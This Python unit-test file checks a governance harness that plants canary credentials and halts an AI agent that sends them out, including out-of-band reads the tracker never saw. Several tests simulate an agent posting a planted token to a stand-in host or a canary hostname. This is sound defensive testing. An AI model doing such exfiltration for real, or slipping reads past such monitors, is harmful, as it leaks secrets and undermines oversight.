"""Wave-143 unit tests: unobserved-canary egress detection.

Row-13 residual: reads that happen out-of-band (not through the
governed ``read_file``) are invisible to the rare-token tracker. This
covers the new seams at their public boundaries:

- ``gov.unobserved_canary.source_artifacts_for`` / ``has_recorded_read``
  / ``trip_unobserved`` (pure query + trip behavior),
- ``RareTokenTracker.observed_source_ids`` / ``durable_source_ids``
  (read-source queries; verdict paths untouched),
- ``gov.canary.CANARY_LABEL_ARTIFACTS`` sync with ``plant_canaries``'
  layout (a new label without a map entry fails loudly),
- executor-level wiring: ``check_and_trip`` branches to the
  ``unobserved_canary_egress`` path only when a tracker is installed
  and no read was recorded (zero behavior change otherwise).

Deterministic, hermetic (make_run temp dirs), $0.
"""

import os
import secrets
import sys
import tempfile
import unittest
from pathlib import Path

_TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
for _p in (_TESTS_DIR, os.path.dirname(_TESTS_DIR)):
    if _p not in sys.path:
        sys.path.insert(0, _p)

os.environ.setdefault("TMPDIR", "/tmp/gov-run")
os.environ.setdefault("GOV_LOG_KEY", secrets.token_hex(32))
os.environ.setdefault("GOV_LOG_KEY_EPOCH", "test")

from harness import make_run
from gov import canary as cy
from gov.canary import (CanaryMint, CanaryRegistry, CanaryTripHalt,
                        plant_canaries, check_and_trip,
                        CANARY_LABEL_ARTIFACTS)
from gov import unobserved_canary as uc
from gov import rare_token as rt
from gov import taint_ledger as tl

_LEDGER_KEY = b"unobserved-canary-unit-test-key"


def _mint(reg_run_id="run-unobs-unit"):
    m = CanaryMint(reg_run_id)
    r = CanaryRegistry()
    r.register(m)
    return m, r


def _value_for_label(registry, label):
    for value, meta in registry._by_value.items():
        if meta["label"] == label:
            return value, meta
    raise AssertionError("no canary with label %r" % label)


def _hit(label):
    return {"kind": "credential", "label": label,
            "matched_value": "<redacted>", "field": "args"}


def _run_with(tracker=True):
    run = make_run()
    m, reg = _mint()
    ex = run["executor"]
    ex.canary_registry = reg
    if tracker:
        ex.rare_token_tracker = rt.RareTokenTracker()
    ident = run["mint_identity"]("agent-1", "operator", "op-1")
    return run, ident, m, reg


def _events(run, event):
    return [e for e in run["read_log"]()
            if isinstance(e, dict) and e.get("event") == event]


class TestLabelMap(unittest.TestCase):
    def test_every_mint_label_has_map_entry(self):
        labels = {c["label"] for c in CanaryMint("run-map-sync").values()}
        self.assertEqual(set(CANARY_LABEL_ARTIFACTS), labels)

    def test_map_matches_plant_layout(self):
        # The map must mirror plant_canaries: a label's value appears
        # in each listed artifact file, and tripwire-only labels
        # appear in NO planted file.
        m, _reg = _mint("run-map-layout")
        with tempfile.TemporaryDirectory() as jail:
            plant_canaries(jail, m)
            files = {}
            for p in Path(jail).rglob("*"):
                if p.is_file():
                    files[str(p.relative_to(jail))] = p.read_text(
                        encoding="utf-8")
            for c in m.values():
                arts = CANARY_LABEL_ARTIFACTS[c["label"]]
                if arts:
                    for rel in arts:
                        self.assertIn(rel, files,
                                      "artifact %s not planted" % rel)
                        self.assertIn(c["value"], files[rel],
                                      "label %s value missing from %s"
                                      % (c["label"], rel))
                else:
                    hits = [rel for rel, text in files.items()
                            if c["value"] in text]
                    self.assertEqual(
                        hits, [],
                        "tripwire-only label %s leaked into %s"
                        % (c["label"], hits))

    def test_unknown_label_maps_to_empty(self):
        self.assertEqual(uc.source_artifacts_for("no-such-label"), ())


class TestHasRecordedRead(unittest.TestCase):
    def test_none_tracker_is_not_recorded(self):
        _m, reg = _mint()
        value, _meta = _value_for_label(reg, "github-token")
        self.assertFalse(uc.has_recorded_read(None, "agent-1",
                                              _hit("github-token")))

    def test_no_reads_is_not_recorded(self):
        _m, reg = _mint()
        t = rt.RareTokenTracker()
        self.assertFalse(uc.has_recorded_read(t, "agent-1",
                                              _hit("github-token")))

    def test_auto_source_id_covers_artifact(self):
        t = rt.RareTokenTracker()
        t.observe_read("agent-1", "read:auto:config/service.conf",
                       "api_token = secretstuff")
        self.assertTrue(uc.has_recorded_read(t, "agent-1",
                                             _hit("github-token")))

    def test_bare_source_id_covers_artifact(self):
        t = rt.RareTokenTracker()
        t.observe_read("agent-1", "config/service.conf",
                       "api_token = secretstuff")
        self.assertTrue(uc.has_recorded_read(t, "agent-1",
                                             _hit("github-token")))

    def test_absolute_path_covers_artifact(self):
        t = rt.RareTokenTracker()
        t.observe_read("agent-1", "/tmp/xyz/sandbox/.env",
                       "INTERNAL_API_TOKEN=int_abcdef0123456789zz")
        self.assertTrue(uc.has_recorded_read(
            t, "agent-1", _hit("internal-api-token")))

    def test_multi_artifact_label_any_cover_counts(self):
        # database-url is planted in .env AND config/service.conf.
        t = rt.RareTokenTracker()
        t.observe_read("agent-1", "read:auto:.env",
                       "DATABASE_URL=postgres://svc_acct:zz@db/x")
        self.assertTrue(uc.has_recorded_read(t, "agent-1",
                                             _hit("database-url")))

    def test_unrelated_read_does_not_cover(self):
        t = rt.RareTokenTracker()
        t.observe_read("agent-1", "read:auto:notes.txt",
                       "weekly status zephyrcorp")
        self.assertFalse(uc.has_recorded_read(t, "agent-1",
                                              _hit("github-token")))

    def test_other_agent_read_does_not_cover(self):
        t = rt.RareTokenTracker()
        t.observe_read("agent-2", "read:auto:config/service.conf",
                       "api_token = secretstuff")
        self.assertFalse(uc.has_recorded_read(t, "agent-1",
                                              _hit("github-token")))

    def test_tripwire_only_label_never_recorded(self):
        # slack-token is registered but never planted: no governed
        # read can exist for it -- unobserved by construction, even
        # with reads recorded for other artifacts.
        t = rt.RareTokenTracker()
        t.observe_read("agent-1", "read:auto:config/service.conf",
                       "api_token = secretstuff")
        self.assertFalse(uc.has_recorded_read(t, "agent-1",
                                              _hit("slack-token")))

    def test_zero_token_read_still_counts_in_run(self):
        # The in-run tracker stores EVERY observation; a zero-token
        # read of the artifact is still a recorded read of it.
        t = rt.RareTokenTracker()
        res = t.observe_read("agent-1", "read:auto:.env", "nothing here")
        self.assertEqual(res["rare_token_count"], 0)
        self.assertIn("read:auto:.env",
                      t.observed_source_ids("agent-1"))
        self.assertTrue(uc.has_recorded_read(
            t, "agent-1", _hit("internal-api-token")))

    def test_cross_run_ledger_read_counts(self):
        with tempfile.TemporaryDirectory() as d:
            lp = os.path.join(d, "taint.jsonl")
            t1 = rt.RareTokenTracker(taint_ledger=tl.TaintLedger(
                lp, hmac_key=_LEDGER_KEY))
            t1.observe_read(
                "agent-1", "read:auto:.env",
                "INTERNAL_API_TOKEN=int_abcdef0123456789zz")
            # Run 2: fresh tracker, same ledger file -- no in-run reads.
            t2 = rt.RareTokenTracker(taint_ledger=tl.TaintLedger(
                lp, hmac_key=_LEDGER_KEY))
            self.assertEqual(t2.observed_source_ids("agent-1"), [])
            self.assertIn("read:auto:.env",
                          t2.durable_source_ids("agent-1"))
            self.assertTrue(uc.has_recorded_read(
                t2, "agent-1", _hit("internal-api-token")))

    def test_no_ledger_durable_ids_empty(self):
        t = rt.RareTokenTracker()
        self.assertEqual(t.durable_source_ids("agent-1"), [])


class TestTripUnobserved(unittest.TestCase):
    def test_trip_halts_audits_escalates(self):
        run, ident, m, reg = _run_with()
        ex = run["executor"]
        value, _meta = _value_for_label(reg, "github-token")
        with self.assertRaises(CanaryTripHalt):
            uc.trip_unobserved(ex, ident, "http_post",
                               {"url": "https://x.invalid/", "data": value},
                               _hit("github-token"))
        unobs = _events(run, "unobserved_canary_egress")
        self.assertEqual(len(unobs), 1)
        ev = unobs[0]
        self.assertEqual(ev["decision"], "halted")
        self.assertEqual(ev["flag"], "unobserved_canary_egress")
        self.assertEqual(ev["policy_id"], "canary-tripwire-unobserved")
        self.assertEqual(ev["canary_label"], "github-token")
        self.assertFalse(ev["recorded_read"])
        # The event carries label/kind/field -- never the value.
        self.assertNotIn(value, str(ev))
        self.assertEqual(_events(run, "canary_trip"), [])
        pending = [r for r in run["approvals"].all()
                   if r.get("policy_flag") == "unobserved_canary_egress"]
        self.assertEqual(len(pending), 1)

    def test_fail_closed_when_audit_raises(self):
        run, ident, m, reg = _run_with()
        ex = run["executor"]
        real_append = ex.log.append

        def boom(entry):
            raise OSError("log down")
        ex.log.append = boom
        try:
            with self.assertRaises(CanaryTripHalt):
                uc.trip_unobserved(ex, ident, "http_post",
                                   {"data": "x"}, _hit("github-token"))
        finally:
            ex.log.append = real_append


class TestCheckAndTripWiring(unittest.TestCase):
    def test_no_tracker_keeps_canary_trip(self):
        # Zero behavior change vs wave-51 when no tracker is installed.
        run, ident, m, reg = _run_with(tracker=False)
        value, _meta = _value_for_label(reg, "github-token")
        with self.assertRaises(CanaryTripHalt):
            check_and_trip(run["executor"], ident, "http_post",
                           {"url": "https://x.invalid/", "data": value})
        self.assertEqual(len(_events(run, "canary_trip")), 1)
        self.assertEqual(len(_events(run, "unobserved_canary_egress")), 0)

    def test_tracker_no_read_routes_unobserved(self):
        run, ident, m, reg = _run_with()
        value, _meta = _value_for_label(reg, "github-token")
        with self.assertRaises(CanaryTripHalt):
            check_and_trip(run["executor"], ident, "http_post",
                           {"url": "https://x.invalid/", "data": value})
        self.assertEqual(len(_events(run, "unobserved_canary_egress")), 1)
        self.assertEqual(len(_events(run, "canary_trip")), 0)

    def test_tracker_with_read_keeps_canary_trip(self):
        run, ident, m, reg = _run_with()
        ex = run["executor"]
        value, _meta = _value_for_label(reg, "github-token")
        ex.note_read_output("agent-1", "read:auto:config/service.conf",
                            "api_token = %s\n" % value)
        with self.assertRaises(CanaryTripHalt):
            check_and_trip(ex, ident, "http_post",
                           {"url": "https://x.invalid/", "data": value})
        self.assertEqual(len(_events(run, "canary_trip")), 1)
        self.assertEqual(len(_events(run, "unobserved_canary_egress")), 0)

    def test_no_hit_no_events(self):
        run, ident, m, reg = _run_with()
        self.assertIsNone(check_and_trip(
            run["executor"], ident, "http_post",
            {"url": "https://synthetic.local/api", "data": "benign"}))
        self.assertEqual(len(_events(run, "canary_trip")), 0)
        self.assertEqual(len(_events(run, "unobserved_canary_egress")), 0)

    def test_hostname_hit_unobserved_without_read(self):
        run, ident, m, reg = _run_with()
        host = next(v for v, meta in reg._by_value.items()
                    if meta["kind"] == "hostname")
        with self.assertRaises(CanaryTripHalt):
            check_and_trip(run["executor"], ident, "http_post",
                           {"url": "https://%s/collect" % host,
                            "data": "x"})
        unobs = _events(run, "unobserved_canary_egress")
        self.assertEqual(len(unobs), 1)
        self.assertEqual(unobs[0]["canary_kind"], "hostname")
        self.assertEqual(len(_events(run, "canary_trip")), 0)


if __name__ == "__main__":
    unittest.main()
